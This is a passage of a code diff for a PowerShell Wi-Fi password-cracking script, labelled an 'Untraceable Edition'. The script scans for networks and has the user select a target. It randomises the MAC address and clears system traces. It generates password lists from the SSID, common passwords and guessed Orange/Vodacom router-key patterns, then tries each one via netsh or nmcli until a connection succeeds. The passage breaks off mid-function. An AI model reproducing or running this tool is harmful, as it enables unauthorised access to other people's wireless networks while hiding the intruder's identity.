-                if ([string]::IsNullOrWhiteSpace($trimmedLine)) { continue }
-                
-                Write-Log "Processing line $lineNumber : $trimmedLine" "DEBUG" $LogFile $DebugFile
-                
-                if ($trimmedLine -match "^SSID\s+\d+\s*:\s*(.+)$") {
-                    if ($currentNetwork -and -not [string]::IsNullOrWhiteSpace($currentNetwork.SSID)) { 
-                        [void]$networks.Add($currentNetwork)
-                        Write-Log "Added network: $($currentNetwork.SSID) (Signal: $($currentNetwork.Signal)%, Security: $($currentNetwork.Security))" "DEBUG" $LogFile $DebugFile
+                if ($trimmed -match "^SSID\s+\d+\s*:\s*(.+)$") {
+                    if ($current -and $current.SSID) { 
+                        [void]$networks.Add($current) 
                     }
                     
-                    $ssidName = $matches[1].Trim()
-                    $ssidName = $ssidName -replace '[\x00-\x1F\x7F]', ''
-                    
-                    $currentNetwork = @{
-                        SSID = $ssidName
+                    $current = @{
+                        SSID = $matches[1].Trim() -replace '[\x00-\x1F\x7F]', ''
                         Security = "Unknown"
                         Signal = 0
-                        BSSID = ""
-                        Authentication = ""
-                        Encryption = ""
-                        NetworkType = ""
                     }
-                    
-                    Write-Log "Found SSID: $ssidName" "DEBUG" $LogFile $DebugFile
                 }
-                elseif ($currentNetwork) {
-                    if ($trimmedLine -match "Authentication\s*:\s*(.+)" -or 
-                        $trimmedLine -match "Authentification\s*:\s*(.+)") {
-                        $currentNetwork.Authentication = $matches[1].Trim()
-                        $currentNetwork.Security = $matches[1].Trim()
+                elseif ($current) {
+                    if ($trimmed -match "Authentication\s*:\s*(.+)") {
+                        $current.Security = $matches[1].Trim()
                     }
-                    elseif ($trimmedLine -match "Cipher\s*:\s*(.+)" -or 
-                            $trimmedLine -match "Chiffrement\s*:\s*(.+)") {
-                        $currentNetwork.Encryption = $matches[1].Trim()
-                    }
-                    elseif ($trimmedLine -match "Signal\s*:\s*(\d+)") {
-                        $currentNetwork.Signal = [int]$matches[1].Trim()
-                    }
-                    elseif ($trimmedLine -match "Network type\s*:\s*(.+)" -or
-                            $trimmedLine -match "Type de réseau\s*:\s*(.+)") {
-                        $currentNetwork.NetworkType = $matches[1].Trim()
-                    }
-                    elseif ($trimmedLine -match "BSSID\s+\d+\s*:\s*([0-9a-fA-F:]+)") {
-                        $currentNetwork.BSSID = $matches[1].Trim()
+                    elseif ($trimmed -match "Signal\s*:\s*(\d+)") {
+                        $current.Signal = [int]$matches[1].Trim()
                     }
                 }
             }
             
-            if ($currentNetwork -and -not [string]::IsNullOrWhiteSpace($currentNetwork.SSID)) { 
-                [void]$networks.Add($currentNetwork)
-                Write-Log "Added final network: $($currentNetwork.SSID)" "DEBUG" $LogFile $DebugFile
+            if ($current -and $current.SSID) { 
+                [void]$networks.Add($current) 
+            }
+        }
+        elseif ($Global:OS_TYPE -eq "Linux") {
+            $iface = $Global:Config.Interface
+            $scan = sudo iw dev $iface scan 2>$null | Out-String
+            
+            if (-not $scan) {
+                $scan = sudo iwlist $iface scan 2>$null | Out-String
             }
             
-        } else {
-            $interface = $script:CONFIG.Interface
-            if (-not $interface) { $interface = "wlan0" }
-            
-            if ($interface -notmatch '^[a-zA-Z0-9_\-]+$') {
-                throw "Invalid interface name detected: '$interface'. Allowed characters: a-z, A-Z, 0-9, _, -"
-            }
-            
-            Write-Host "Scanning on Linux interface: $interface" -ForegroundColor Yellow
-            
-            $scanOutput = sudo iw dev $interface scan 2>$null | Out-String
-            
-            if (-not $scanOutput) {
-                $scanOutput = sudo iwlist $interface scan 2>$null | Out-String
-            }
-            
-            if ($scanOutput) {
-                $cells = $scanOutput -split "(?=(BSS|Cell) [0-9a-f]{2}:)"
+            if ($scan) {
+                $cells = $scan -split "(?=(BSS|Cell) [0-9a-f]{2}:)"
                 foreach ($cell in $cells) {
                     if ($cell -match "SSID:\s*(.+)") {
                         $ssid = $matches[1].Trim()
-                        
-                        if ([string]::IsNullOrWhiteSpace($ssid) -or $ssid -eq "\x00" -or $ssid -eq "\x00\x00\x00") {
-                            continue
-                        }
+                        if ([string]::IsNullOrWhiteSpace($ssid) -or $ssid -eq "\x00") { continue }
                         
                         $signal = 0
-                        if ($cell -match "signal:\s*(-?\d+(\.\d+)?)") {
-                            $signalDbm = [decimal]$matches[1]
-                            $signal = [Math]::Min(100, [Math]::Max(0, 2 * ($signalDbm + 100)))
+                        if ($cell -match "signal:\s*(-?\d+)") {
+                            $signal = [Math]::Min(100, [Math]::Max(0, 2 * ([int]$matches[1] + 100)))
                         }
                         
-                        $security = "Open"
-                        if ($cell -match "RSN") { $security = "WPA2" }
-                        elseif ($cell -match "WPA") { $security = "WPA" }
+                        $sec = "Open"
+                        if ($cell -match "RSN") { $sec = "WPA2" }
+                        elseif ($cell -match "WPA") { $sec = "WPA" }
                         
                         [void]$networks.Add(@{
                             SSID = $ssid
-                            Security = $security
-                            Signal = [int]$signal
-                            BSSID = ""
-                            Authentication = $security
-                            Encryption = ""
-                            NetworkType = "Infrastructure"
+                            Security = $sec
+                            Signal = $signal
                         })
                     }
                 }
             }
         }
-        
-        $filteredNetworks = @($networks | Where-Object { 
-            -not [string]::IsNullOrWhiteSpace($_.SSID) -and
-            $_.SSID -ne "\x00" -and
-            $_.Signal -ge 1
-        } | Sort-Object -Property Signal -Descending)
-        
-        Write-Log "Found $($filteredNetworks.Count) valid networks" "INFO" $LogFile $DebugFile
-        
-        return $filteredNetworks
-        
     }
-    catch {
-        Write-Log "Scan failed: $_" "ERROR" $LogFile $DebugFile
-        Write-Log "Stack trace: $($_.ScriptStackTrace)" "DEBUG" $LogFile $DebugFile
-        return $null
-    }
+    catch {}
+    
+    return @($networks | Where-Object { $_.Signal -ge 1 } | Sort-Object -Property Signal -Descending)
 }
 
-<#
-.SYNOPSIS
-    Generates pattern-based passwords for Orange/Vodacom boxes
-    Based on analysis of password: 2TFG3AQ72NZH5CCAGX
-#>
-function Generate-OrangeVodacomPatterns {
-    $patterns = [System.Collections.Generic.List[string]]::new()
-    
-    # Analysis of known Orange Fiber password: 2TFG3AQ72NZH5CCAGX
-    # Structure: [Digit][3xUpper][Digit][2xUpper][2xDigit][3xUpper][Digit][2xUpper][2xUpper]
-    # This appears to be Base36 encoded serial number
-    
-    # Orange Livebox patterns (MAC-based prefixes)
-    $orangePrefixes = @("2TFG", "2TFH", "2TFJ", "3AFG", "2UFG", "A4B8", "001F", "0024")
-    $orangeMiddles = @("3AQ7", "3AR7", "3BQ7", "4AQ7", "3AP7", "3AQ8")
-    $orangeCenters = @("2NZH", "2NZJ", "2NYH", "3NZH", "2NZG", "2MZH")
-    $orangeSuffixes = @("5CCAGX", "5CCAGY", "5CDAGX", "5CCAHX", "5CCAGZ", "5DCAGX")
-    
-    # Generate combinations
-    foreach ($pre in $orangePrefixes) {
-        foreach ($mid in $orangeMiddles) {
-            foreach ($cen in $orangeCenters) {
-                foreach ($suf in $orangeSuffixes) {
-                    [void]$patterns.Add("$pre$mid$cen$suf")
-                }
-            }
-        }
-    }
-    
-    # Vodacom patterns (different structure, often more numeric)
-    $vodacomPrefixes = @("001D0F", "0022CF", "001E58", "002147", "C0A0BB", "001D0E")
-    foreach ($prefix in $vodacomPrefixes) {
-        # Generate 12-character suffix variations
-        for ($i = 0; $i -lt 50; $i++) {
-            $suffix = -join ((48..57) + (65..70) | Get-Random -Count 12 | ForEach-Object { [char]$_ })
-            [void]$patterns.Add("$prefix$suffix")
-        }
-    }
-    
-    # Base36 patterns (alphanumeric beyond just hex)
-    $base36Chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-    for ($i = 0; $i -lt 100; $i++) {
-        $pass = -join (1..18 | ForEach-Object { $base36Chars[(Get-Random -Maximum 36)] })
-        [void]$patterns.Add($pass)
-    }
-    
-    # Patterns with double characters (observed in 2TFG3AQ72NZH5CCAGX: two 2's, two A's, CC)
-    $doublePatterns = @(
-        "2[A-Z]{3}3[A-Z]{2}72[A-Z]{3}5[A-Z]{2}GX",
-        "2[A-Z]{2}G3[A-Z]Q7[A-Z]NZH5[A-Z]{2}AGX",
-        "3[A-Z]{3}4[A-Z]{2}83[A-Z]{3}6[A-Z]{2}HY",
-        "1[A-Z]{3}2[A-Z]{2}91[A-Z]{3}4[A-Z]{2}KZ"
-    )
-    
-    foreach ($pattern in $doublePatterns) {
-        # Generate variations by replacing [A-Z] with actual letters
-        for ($i = 0; $i -lt 20; $i++) {
-            $actual = $pattern
-            while ($actual -match '\[A-Z\]') {
-                $char = [char](65 + (Get-Random -Maximum 26))
-                $actual = $actual -replace '\[A-Z\]', $char, 1
-            }
-            [void]$patterns.Add($actual)
-        }
-    }
-    
-    # Year-based patterns (manufacturing dates)
-    $years = @("2022", "2023", "2024")
-    $months = @("01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12")
-    foreach ($year in $years) {
-        foreach ($month in $months) {
-            # YYMM + 14 random hex chars
-            $suffix = -join ((48..57) + (65..70) | Get-Random -Count 14 | ForEach-Object { [char]$_ })
-            [void]$patterns.Add(($year.Substring(2,2) + $month + $suffix))
-        }
-    }
-    
-    # Common hex sequences found in ISP routers
-    $commonSequences = @(
-        "1234567890ABCDEF01", "0987654321FEDCBA09",
-        "ABCDEF1234567890AB", "FEDCBA0987654321FE",
-        "0123456789ABCDEF01", "FEDCBA9876543210FE",
-        "AABBCCDDEEFF001122", "112233445566778899",
-        "001122334455667788", "887766554433221100"
-    )
-    
-    foreach ($seq in $commonSequences) {
-        [void]$patterns.Add($seq)
-        # Add variations with different prefixes/suffixes
-        [void]$patterns.Add("00$seq")
-        [void]$patterns.Add("$seq`00")
-    }
-    
-    return $patterns
-}
-
-<#
-.SYNOPSIS
-    Generates password list with 18-character hex and Orange/Vodacom patterns
-#>
-function Generate-PasswordList {
-    param(
-        [string]$SSID,
-        [string]$LogFile,
-        [string]$DebugFile,
-        $WrongPasswords,
-        [int]$HexCount = 5000
-    )
-    
-    Write-Log "Generating password list..." "INFO" $LogFile $DebugFile
-    
-    $passwords = [System.Collections.Generic.List[string]]::new()
-    
-    # Generate 18-character random hex passwords
-    Write-Log "Generating $HexCount random hex passwords (18 chars)..." "INFO" $LogFile $DebugFile
-    
-    $generator = [HexPasswordGenerator]::new($script:CONFIG.HexPasswordLength)
-    $hexBatch = $generator.GenerateBatch($HexCount)
-    
-    foreach ($hex in $hexBatch) {
-        if (-not $WrongPasswords -or -not $WrongPasswords.Contains($hex)) {
-            [void]$passwords.Add($hex)
-        }
-    }
-    
-    # Add common hex patterns
-    $hexPatterns = @(
-        "000000000000000000", "111111111111111111", "888888888888888888",
-        "123456789012345678", "876543210987654321",
-        "ABCDEF123456789012", "0123456789ABCDEF01",
-        "FEDCBA0987654321EF", "AABBCCDDEEFF001122",
-        "001122334455667788", "112233445566778899"
-    )
-    
-    foreach ($pattern in $hexPatterns) {
-        if (-not $WrongPasswords -or -not $WrongPasswords.Contains($pattern)) {
-            [void]$passwords.Add($pattern)
-        }
-    }
-    
-    # Add Orange/Vodacom specific patterns if enabled
-    if ($script:CONFIG.PatternMode) {
-        Write-Log "Generating Orange/Vodacom pattern passwords..." "INFO" $LogFile $DebugFile
-        
-        $ispPatterns = Generate-OrangeVodacomPatterns
-        
-        foreach ($pattern in $ispPatterns) {
-            if ($pattern.Length -eq 18 -and (-not $WrongPasswords -or -not $WrongPasswords.Contains($pattern))) {
-                [void]$passwords.Add($pattern)
-            }
-        }
-        
-        Write-Log "Added $($ispPatterns.Count) ISP-specific patterns" "INFO" $LogFile $DebugFile
-    }
-    
-    # Load custom wordlists if exist
-    $listsFolder = Join-Path $script:CONFIG.LogDirectory "lists"
-    if (Test-Path $listsFolder) {
-        Get-ChildItem -Path $listsFolder -Filter "*.txt" -ErrorAction SilentlyContinue | ForEach-Object {
-            $words = Get-Content $_.FullName | ForEach-Object { $_.Trim() }
-            foreach ($word in $words) {
-                if ($word.Length -eq 18 -and (-not $WrongPasswords -or -not $WrongPasswords.Contains($word))) {
-                    [void]$passwords.Add($word)
-                }
-            }
-        }
-    }
-    
-    # Remove duplicates
-    $unique = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
-    $finalList = [System.Collections.Generic.List[string]]::new()
-    
-    foreach ($pass in $passwords) {
-        if ($unique.Add($pass)) {
-            [void]$finalList.Add($pass)
-        }
-    }
-    
-    Write-Log "Total unique passwords generated: $($finalList.Count)" "INFO" $LogFile $DebugFile
-    
-    return $finalList
-}
-
-<#
-.SYNOPSIS
-    Tests WiFi connection with given password (cross-platform)
-#>
-function Test-WifiConnection {
-    param(
-        [string]$SSID,
-        [string]$Password,
-        [string]$Security,
-        [string]$Interface,
-        [string]$LogFile,
-        [string]$DebugFile
-    )
+function Test-Password {
+    param([string]$SSID, [string]$Password, [string]$Interface)
     
     try {
-        if ($script:CONFIG.IsWindows) {
-            $profileName = "Temp_$(Get-Random)"
-            $profileXml = @"
+        if ($Global:OS_TYPE -eq "Windows") {
+            $profileName = "T_$(Get-Random)"
+            
+            $xml = @"
 <?xml version="1.0"?>
 <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
     <name>$profileName</name>
-    <SSIDConfig>
-        <SSID>
-            <name>$([Security.SecurityElement]::Escape($SSID))</name>
-        </SSID>
-    </SSIDConfig>
+    <SSIDConfig><SSID><name>$([Security.SecurityElement]::Escape($SSID))</name></SSID></SSIDConfig>
     <connectionType>ESS</connectionType>
     <connectionMode>manual</connectionMode>
     <MSM>
@@ -1099,275 +335,387 @@ function Test-WifiConnection {
 "@
             
             $tempFile = [System.IO.Path]::GetTempFileName()
-            $profileXml | Out-File -FilePath $tempFile -Encoding UTF8
+            $xml | Out-File -FilePath $tempFile -Encoding UTF8
             
             netsh wlan add profile filename="$tempFile" interface="$Interface" | Out-Null
             netsh wlan connect name="$profileName" interface="$Interface" | Out-Null
             
-            Start-Sleep -Milliseconds 2000
+            Start-Sleep -Milliseconds 2500
             
-            $interfaceInfo = netsh wlan show interfaces interface="$Interface" | Out-String
-            $connected = ($interfaceInfo -match "State\s+:\s+connected" -and $interfaceInfo -match "SSID\s+:\s+$([regex]::Escape($SSID))")
+            $info = netsh wlan show interfaces interface="$Interface" | Out-String
+            $success = ($info -match "State\s+:\s+connected" -and $info -match "SSID\s+:\s+$([regex]::Escape($SSID))")
             
             netsh wlan delete profile name="$profileName" | Out-Null
             Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
             
-            return $connected
-            
-        } else {
-            $connectionName = "temp_$(Get-Random)"
-            
-            $result = sudo nmcli connection add type wifi con-name $connectionName ifname $Interface ssid $SSID wifi-sec.key-mgmt wpa-psk wifi-sec.psk $Password 2>&1
-            sudo nmcli connection up $connectionName 2>&1 | Out-Null
+            return $success
+        }
+        elseif ($Global:OS_TYPE -eq "Linux") {
+            $connName = "temp_$(Get-Random)"
+            sudo nmcli connection add type wifi con-name $connName ifname $Interface ssid $SSID wifi-sec.key-mgmt wpa-psk wifi-sec.psk $Password 2>&1 | Out-Null
+            sudo nmcli connection up $connName 2>&1 | Out-Null
             Start-Sleep -Milliseconds 2000
             
-            $active = sudo nmcli connection show --active | Select-String $connectionName
-            sudo nmcli connection delete $connectionName 2>&1 | Out-Null
+            $active = sudo nmcli connection show --active | Select-String $connName
+            sudo nmcli connection delete $connName 2>&1 | Out-Null
             
             return ($active -ne $null)
         }
+        
+        return $false
     }
     catch {
-        Write-Log "Connection test error: $_" "ERROR" $LogFile $DebugFile
         return $false
     }
 }
 
 # ============================================
-# MAIN FUNCTION
+# PASSWORD GENERATION
 # ============================================
 
-function Start-WifiCrack {
-    try {
-        # Initialization
-        $defaultLogs = Get-LogPaths
-        
-        if (-not (Test-AdminRights)) {
-            Write-Host "Administrator/root rights required!" -ForegroundColor Red
-            return
+function Get-SSIDPasswords {
+    param([string]$SSID)
+    
+    $passwords = @()
+    if ([string]::IsNullOrWhiteSpace($SSID)) { return $passwords }
+    
+    $clean = $SSID.Trim()
+    $lower = $clean.ToLower()
+    $words = $clean -split '[-_\s]+'
+    $first = $words[0]
+    
+    $patterns = @(
+        $clean, $lower, "$clean`123", "$clean`1234", "$clean`2024",
+        "$lower`123", "$lower`1234", "$lower`2024", "$first`123",
+        "$first`1234", "$first`2024", "$first`wifi", "$first`password",
+        "wifi$clean", "$clean`wifi", "$clean`password", "$clean`admin",
+        "$clean-123", "$clean-2024", "$clean_123", "$first-123",
+        "$first-2024", "$clean`01", "$clean`001", "$clean`999",
+        "$first`123456", "$first`password", "$first`qwerty", "$first`abc123"
+    )
+    
+    foreach ($p in $patterns) {
+        if ($p.Length -ge 8 -and $p.Length -le 63 -and $p -notin $passwords) {
+            $passwords += $p
         }
-        
-        $envInfo = Get-EnvironmentInfo
-        Write-Log "Environment: $($envInfo.OS) | Admin: $($envInfo.IsAdmin)" "INFO" $defaultLogs.LogFile $defaultLogs.DebugFile
-        
-        # Security checks
-        if (-not $SkipSecurityCheck) {
-            Write-Host "`nPerforming security checks..." -ForegroundColor Yellow
-            $securityMgr = [SecurityManager]::new($defaultLogs.LogFile, $defaultLogs.DebugFile, $script:CONFIG.StealthMode)
-            $securityCheck = $securityMgr.CheckEnvironment()
-            
-            if ($securityCheck.CriticalIssues.Count -gt 0) {
-                Write-Host "`nCRITICAL SECURITY ISSUES:" -ForegroundColor Red
-                foreach ($issue in $securityCheck.CriticalIssues) {
-                    Write-Host "  - $issue" -ForegroundColor Red
-                }
-                if ($script:CONFIG.StealthMode) {
-                    Write-Host "`nOperation aborted." -ForegroundColor Red
-                    return
-                }
-            }
-            
-            if ($securityCheck.Warnings.Count -gt 0) {
-                Write-Host "`nWarnings:" -ForegroundColor Yellow
-                foreach ($warning in $securityCheck.Warnings) {
-                    Write-Host "  - $warning" -ForegroundColor Yellow
-                }
-                $continue = Read-Host "`nContinue? (Y/N)"
-                if ($continue -ne "Y" -and $continue -ne "y") { return }
-            }
-        }
-        
-        Clear-Host
-        Write-Host "WiFi Security Testing Tool v5.0" -ForegroundColor Cyan
-        Write-Host "OS: $($envInfo.OS) | Mode: $Mode | Pattern Mode: $($script:CONFIG.PatternMode)" -ForegroundColor Gray
-        Write-Host "===================================================" -ForegroundColor Cyan
-        
-        # Select adapter
-        $adapter = Select-NetworkAdapter
-        if (-not $adapter) { return }
-        
-        $script:CONFIG.Interface = $adapter.Name
-        $script:CONFIG.InterfaceGUID = if ($adapter.GUID) { $adapter.GUID } else { $adapter.Name }
-        
-        Write-Host "`nSelected: $($adapter.Name)" -ForegroundColor Green
-        
-        # MAC Spoofing
-        Save-OriginalMac -Interface $adapter.Name
-        
-        if (-not $DisableMacSpoof) {
-            Write-Host "`nChanging MAC address..." -ForegroundColor Yellow
-            if (-not (Set-MacAddress -Interface $adapter.Name)) {
-                $cont = Read-Host "Continue with original MAC? (Y/N)"
-                if ($cont -ne "Y" -and $cont -ne "y") { return }
-            }
-        }
-        
-        # Scan networks
-        Write-Host "`nScanning for networks..." -ForegroundColor Yellow
-        $networks = Get-WifiNetworks -LogFile $defaultLogs.LogFile -DebugFile $defaultLogs.DebugFile
-        
-        if (-not $networks -or $networks.Count -eq 0) {
-            Write-Host "No networks found!" -ForegroundColor Red
-            return
-        }
-        
-        Write-Host "`nAvailable Networks:" -ForegroundColor Cyan
-        for ($i = 0; $i -lt $networks.Count; $i++) {
-            Write-Host "[$i] $($networks[$i].SSID) (Signal: $($networks[$i].Signal)%, Security: $($networks[$i].Security))" -ForegroundColor Green
-        }
-        
-        # Select network
-        do {
-            $sel = Read-Host "`nSelect network (0-$($networks.Count - 1))"
-        } while ($sel -notmatch '^\d+$' -or [int]$sel -lt 0 -or [int]$sel -ge $networks.Count)
-        
-        $target = $networks[[int]$sel]
-        Write-Host "`nTarget: $($target.SSID)" -ForegroundColor Cyan
-        
-        # Initialize
-        $paths = Get-LogPaths -SSID $target.SSID
-        
-        # Generate passwords
-        Write-Host "`nGenerating password list..." -ForegroundColor Yellow
-        $wrongPasswords = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
-        
-        if (Test-Path $paths.WrongPasswordsFile) {
-            Get-Content $paths.WrongPasswordsFile | ForEach-Object { [void]$wrongPasswords.Add($_) }
-        }
-        
-        $passwordList = Generate-PasswordList -SSID $target.SSID -LogFile $paths.LogFile -DebugFile $paths.DebugFile -WrongPasswords $wrongPasswords -HexCount $HexPasswordCount
-        
-        if ($passwordList.Count -eq 0) {
-            Write-Host "No passwords generated!" -ForegroundColor Red
-            return
-        }
-        
-        Write-Host "Total passwords to test: $($passwordList.Count)" -ForegroundColor Cyan
-        if ($script:CONFIG.PatternMode) {
-            Write-Host "Pattern mode enabled: Orange/Vodacom specific patterns included" -ForegroundColor Magenta
-        }
-        Write-Host "Press 'Q' to stop`n" -ForegroundColor Yellow
-        
-        # Test
-        $connectionMgr = [ConnectionStateManager]::new($script:CONFIG.Interface, $script:CONFIG.InterfaceGUID, $paths.LogFile, $paths.DebugFile)
-        $progress = [ProgressTracker]::new($passwordList.Count, $paths.LogFile, $paths.DebugFile)
-        $connectionMgr.StartTimer()
-        
-        $hexTested = 0
-        $patternTested = 0
-        
-        foreach ($password in $passwordList) {
-            if ([Console]::KeyAvailable) {
-                $key = [Console]::ReadKey($true)
-                if ($key.Key -eq 'Q') { break }
-            }
-            
-            $progress.UpdateProgress($password)
-            
-            # Counter
-            if ($password -match '^[0-9A-F]{18}$') { 
-                $hexTested++ 
-            } else { 
-                $patternTested++ 
-            }
-            
-            # Periodic security check
-            $timeSinceLastCheck = (Get-Date) - $script:CONFIG.LastSecurityCheck
-            if ($timeSinceLastCheck.TotalSeconds -gt $script:CONFIG.SecurityCheckInterval) {
-                if (-not $SkipSecurityCheck) {
-                    $quickCheck = [SecurityManager]::new($paths.LogFile, $paths.DebugFile, $script:CONFIG.StealthMode)
-                    $check = $quickCheck.CheckEnvironment()
-                    if ($check.CriticalIssues.Count -gt 0) {
-                        Write-Host "`nSECURITY ALERT!" -ForegroundColor Red
-                        break
+    }
+    
+    return $passwords
+}
+
+function Get-CommonPasswords {
+    return @(
+        "12345678", "123456789", "1234567890", "password", "password123",
+        "qwerty123", "abc12345", "letmein1", "welcome1", "monkey123",
+        "dragon123", "master123", "sunshine", "princess", "admin1234",
+        "login1234", "welcome123", "password1", "1234qwer", "qwertyuiop",
+        "123456789a", "super123", "hello123", "freedom1", "whatever",
+        "qazwsx123", "trustno1", "baseball", "football", "iloveyou",
+        "computer", "starwars", "pokemon1", "hello1234", "adminadmin",
+        "admin12345", "useruser12", "support123", "default1", "guest1234",
+        "wireless", "wireless123", "wifi12345", "internet1", "broadband",
+        "home1234", "mywifi123", "network1", "connect1", "online123",
+        "11111111", "22222222", "33333333", "44444444", "55555555",
+        "66666666", "77777777", "88888888", "99999999", "00000000",
+        "12121212", "12312312", "11223344", "98765432", "87654321",
+        "qwerty12", "asdfgh12", "zxcvbn12", "1q2w3e4r", "qazwsx12",
+        "20242024", "20232023", "20222022", "password12", "password13",
+        "secret1234", "mypassword", "default123", "changeme1", "home12345",
+        "house123", "office12", "work1234", "family123", "love1234",
+        "internet12", "tech1234", "digital1", "smart123", "phone123",
+        "password123456", "123456789012", "qwerty123456", "letmein12345",
+        "welcome12345", "monkey123456", "dragon123456", "master123456",
+        "sunshine1234", "princess1234", "football12", "baseball12",
+        "iloveyou1234", "trustno123", "whatever123", "password1234",
+        "1234password", "mypassword123", "welcome1234", "password!",
+        "P@ssw0rd", "P@ssw0rd123", "Pass1234", "Password1", "Admin123",
+        "root1234", "toor1234", "guest123", "user1234", "test1234",
+        "demo1234", "temp1234", "pass1234", "key12345", "access12"
+    ) | Select-Object -Unique
+}
+
+function Get-18CharPatterns {
+    $patterns = @()
+    
+    # Orange/Vodacom patterns
+    $prefixes = @("2TFG", "2TFH", "2TFJ", "3AFG", "2UFG", "A4B8", "001F", "0024")
+    $middles = @("3AQ7", "3AR7", "3BQ7", "4AQ7", "3AP7", "3AQ8")
+    $centers = @("2NZH", "2NZJ", "2NYH", "3NZH", "2NZG", "2MZH")
+    $suffixes = @("5CCAGX", "5CCAGY", "5CDAGX", "5CCAHX", "5CCAGZ", "5DCAGX")
+    
+    foreach ($pre in $prefixes) {
+        foreach ($mid in $middles) {
+            foreach ($cen in $centers) {
+                foreach ($suf in $suffixes) {
+                    $pass = "$pre$mid$cen$suf"
+                    if ($pass -notin $patterns) {
+                        $patterns += $pass
                     }
                 }
-                $script:CONFIG.LastSecurityCheck = Get-Date
+            }
+        }
+    }
+    
+    # Random hex
+    $hex = "0123456789ABCDEF"
+    for ($i = 0; $i -lt 1000; $i++) {
+        $pass = -join ((1..18) | ForEach-Object { $hex[(Get-Random -Maximum 16)] })
+        if ($pass -notin $patterns) {
+            $patterns += $pass
+        }
+    }
+    
+    return $patterns
+}
+
+# ============================================
+# MAIN
+# ============================================
+
+function Start-Test {
+    try {
+        Clear-SystemTraces
+        
+        # Header - ASCII only
+        Write-Host ""
+        Write-Host "===============================================================" -ForegroundColor Cyan
+        Write-Host "    WiFi Security Testing Tool - Untraceable Edition" -ForegroundColor Cyan
+        Write-Host "===============================================================" -ForegroundColor Cyan
+        Write-Host "  OS: $($Global:OS_NAME)" -ForegroundColor White
+        Write-Host "  Mode: $($Global:Config.Mode)" -ForegroundColor White
+        Write-Host "===============================================================" -ForegroundColor Cyan
+        Write-Host ""
+        
+        # Admin check
+        $isAdmin = $false
+        if ($Global:OS_TYPE -eq "Windows") {
+            $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
+            $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
+            $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+        } else {
+            $isAdmin = ((id -u) -eq 0)
+        }
+        
+        if (-not $isAdmin) {
+            Write-Host "[ERROR] Administrator/root rights required" -ForegroundColor Red
+            return
+        }
+        
+        # Get adapters
+        Write-Host "[INFO] Detecting network adapters..." -ForegroundColor Yellow
+        $adapters = Get-NetworkAdapters
+        
+        Write-Host "[DEBUG] Found $($adapters.Count) adapters" -ForegroundColor Gray
+        
+        if ($adapters.Count -eq 0) {
+            Write-Host "[ERROR] No wireless adapters found" -ForegroundColor Red
+            Write-Host "[INFO] Make sure WiFi is enabled and drivers are installed" -ForegroundColor Yellow
+            return
+        }
+        
+        Write-Host "`n[ADAPTERS] Available wireless adapters:" -ForegroundColor Cyan
+        for ($i = 0; $i -lt $adapters.Count; $i++) {
+            $statusColor = if ($adapters[$i].Status -eq "Up") { "Green" } else { "Yellow" }
+            Write-Host "  [$i] $($adapters[$i].Name)" -ForegroundColor White -NoNewline
+            Write-Host " - $($adapters[$i].Description) " -NoNewline
+            Write-Host "[$($adapters[$i].Status)]" -ForegroundColor $statusColor
+        }
+        
+        # Selection with validation
+        $validSelection = $false
+        $selectedIndex = -1
+        
+        do {
+            $sel = Read-Host "`nSelect adapter number (0-$($adapters.Count - 1))"
+            
+            # Validate input is a number
+            if ($sel -match '^\d+$') {
+                $selectedIndex = [int]$sel
+                if ($selectedIndex -ge 0 -and $selectedIndex -lt $adapters.Count) {
+                    $validSelection = $true
+                } else {
+                    Write-Host "[ERROR] Number out of range. Please enter 0-$($adapters.Count - 1)" -ForegroundColor Red
+                }
+            } else {
+                Write-Host "[ERROR] Invalid input. Please enter a number." -ForegroundColor Red
+            }
+        } while (-not $validSelection)
+        
+        $adapter = $adapters[$selectedIndex]
+        $Global:Config.Interface = $adapter.Name
+        $Global:Config.OriginalMac = $adapter.MacAddress
+        
+        Write-Host "`n[SELECTED] $($adapter.Name)" -ForegroundColor Green
+        
+        # Change MAC
+        Write-Host "`n[ANON] Changing MAC address..." -ForegroundColor Cyan
+        if (Set-RandomMac -Interface $adapter.Name) {
+            Write-Host "  [OK] MAC changed successfully" -ForegroundColor Green
+        } else {
+            Write-Host "  [WARN] MAC change failed, continuing with original..." -ForegroundColor Yellow
+        }
+        
+        # Scan
+        Write-Host "`n[SCAN] Scanning for WiFi networks..." -ForegroundColor Yellow
+        $networks = Get-WifiNetworks
+        
+        if ($networks.Count -eq 0) {
+            Write-Host "[ERROR] No networks found. Make sure WiFi is enabled." -ForegroundColor Red
+            return
+        }
+        
+        Write-Host "`n[NETWORKS] Found $($networks.Count) networks:" -ForegroundColor Green
+        for ($i = 0; $i -lt $networks.Count; $i++) {
+            $signalColor = if ($networks[$i].Signal -ge 70) { "Green" } elseif ($networks[$i].Signal -ge 40) { "Yellow" } else { "Red" }
+            Write-Host "  [$i] " -NoNewline
+            Write-Host "$($networks[$i].SSID)" -ForegroundColor White -NoNewline
+            Write-Host " (Signal: " -NoNewline
+            Write-Host "$($networks[$i].Signal)%" -ForegroundColor $signalColor -NoNewline
+            Write-Host ", Security: $($networks[$i].Security))"
+        }
+        
+        # Target selection with validation
+        $validTarget = $false
+        $targetIndex = -1
+        
+        do {
+            $sel = Read-Host "`nSelect target network (0-$($networks.Count - 1))"
+            
+            if ($sel -match '^\d+$') {
+                $targetIndex = [int]$sel
+                if ($targetIndex -ge 0 -and $targetIndex -lt $networks.Count) {
+                    $validTarget = $true
+                } else {
+                    Write-Host "[ERROR] Number out of range" -ForegroundColor Red
+                }
+            } else {
+                Write-Host "[ERROR] Invalid input. Please enter a number." -ForegroundColor Red
+            }
+        } while (-not $validTarget)
+        
+        $target = $networks[$targetIndex]
+        Write-Host "`n[TARGET] $($target.SSID)" -ForegroundColor Cyan
+        
+        # Generate passwords
+        Write-Host "`n[GENERATING] Creating password lists..." -ForegroundColor Yellow
+        
+        Write-Host "  [1/3] SSID-based passwords..." -ForegroundColor Gray
+        $p1 = Get-SSIDPasswords -SSID $target.SSID
+        
+        Write-Host "  [2/3] Common world passwords..." -ForegroundColor Gray
+        $p2 = Get-CommonPasswords
+        
